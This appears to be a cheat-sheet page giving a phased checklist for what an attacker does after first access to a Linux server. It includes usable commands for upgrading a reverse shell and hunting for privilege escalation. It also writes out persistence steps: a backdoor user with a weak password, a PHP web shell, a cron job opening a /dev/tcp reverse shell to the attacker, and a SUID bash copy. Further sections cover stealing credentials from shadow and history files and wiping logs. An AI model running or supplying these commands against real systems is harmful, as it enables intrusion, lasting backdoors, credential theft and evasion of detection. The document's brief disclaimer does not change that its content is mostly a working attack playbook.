What to do After Initial Access to linux machine, system or server.
Here is a structured checklist of things to do after gaining initial access to a Linux machine, system or servers.
Important Disclaimer
This information is for educational, authorized penetration testing, and defensive security purposes only. Unauthorized access to computer systems is illegal and unethical. Always ensure you have explicit written permission before testing any system.
Phase 1: Immediate Actions & Stabilization
The first goal is to stabilize your access and understand the basic environment.
1.  Upgrade Your Shell:
 Why: A basic reverse shell is often unstable (e.g., no job control, susceptible to dying).
    Method 1: Python pty
        python3 -c 'import pty; pty.spawn("/bin/bash")'
 Then background the shell with Ctrl+Z, then:
        stty raw -echo; fg
Method 2: Using script/socat for a more robust shell (if available)
        script -qc /bin/bash /dev/null
    socat file:'tty`,raw,echo=0 tcp-connect:<YOUR_IP>:<PORT>
2.  Background Information Gathering:
    Who are you? "id", whoami
    What is the host? hostname, uname -a (Kernel version)
What's running? ps aux (Running processes), "netstat -tulpn" or "ss -tulpn" (Listening ports)
What's the network configuration? "ifconfig" or "ip a"
    Any interesting environment variables? "env"
Phase 2: Reconnaissance & Privilege Escalation Enumeration
The primary goal is often to escalate privileges to root.
3.  Manual Enumeration Checks:
    Sudo Permissions: "sudo -l" (What can the current user run as root? This is gold).
    SUID/SGID Binaries: "find / -perm -u=s -type f 2>/dev/null" (Find binaries with the SUID bit set, which run with owner's privileges).
World-Writable Files: "find / -perm -o=w -type f 2>/dev/null" (Especially in sensitive directories).
Cron Jobs: "cat /etc/crontab", "ls -la /etc/cron*, "crontab -l" (Scheduled tasks that might be exploitable).
Kernel Version: Check "uname -a" against known exploits (e.g., DirtyCow, DirtyPipe).
OS Information: "cat /etc/os-release" (To find distro-specific exploits).
4.  Automated Enumeration Scripts:
   Why: These scripts quickly check for common misconfigurations.
  Popular Tools: Transfer and run one of these.
    LinPEAS: (linpeas.sh) - The most comprehensive and recommended.
    LinEnum: (linenum.sh) - A classic, simpler script.
    Linux Exploit Suggester (LES): (linux-exploit-suggester.sh) - Focuses on suggesting kernel exploits.
How to transfer: Use a local Python HTTP server on your machine and "wget" or "curl" on the target.
Phase 3: Establishing Persistence
Ensure you can get back in if the initial vulnerability is patched or the connection is lost.
5.  Add a New User:
  "sudo useradd -m -s /bin/bash backdooruser"
echo "backdooruser:password123" | sudo chpasswd"
6.  Install SSH Keys:
   Append your public key to "~/.ssh/authorized_keys" of the current user or a new user.
7.  Web Shell:
     Drop a simple PHP or other language-based shell (e.g., "<?php system($_REQUEST['cmd']); ?>") into a web directory if one exists.
8.  Cron Jobs:
   Add a reverse shell that connects back to you periodically.
Edit crontab for the user
(crontab -l ; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1'") | crontab -
9.  SUID Binaries:
Copy "/bin/bash" and set the SUID bit: "cp /bin/bash /tmp/.rootbash; chmod +s /tmp/.rootbash". Then run "/tmp/.rootbash -p" to get a root shell.
Phase 4: Lateral Movement (If in a Network)
If this machine is part of a network, pivot to attack other systems.
10. Network Discovery:
"arp -a" (See other hosts on the local network).
Check the "/etc/hosts" file.
Use "ping" to sweep the network or tools like `nmap` if you can transfer them.
11. Credential Hunting:
History Files: "cat ~/.bash_history"
Configuration Files: Look for passwords in "/etc/passwd" (weak hashes), web app configs (config.php, wp-config.php), and SSH keys.
Memory: Search for passwords in process memory (more advanced).
Privileged Access: Can you read the "/etc/shadow" file? Can you sniff network traffic with tcpdump?
Phase 5: Covering Your Tracks (For Stealth)
Only for advanced red team engagements where stealth is a requirement.
12. Clear Logs:
 Shell History: "echo > ~/.bash_history" and "history -c"
System Logs: Modify or delete relevant entries in "/var/log/" (e.g., auth.log, secure, wtmp, utmp). This often requires root access.
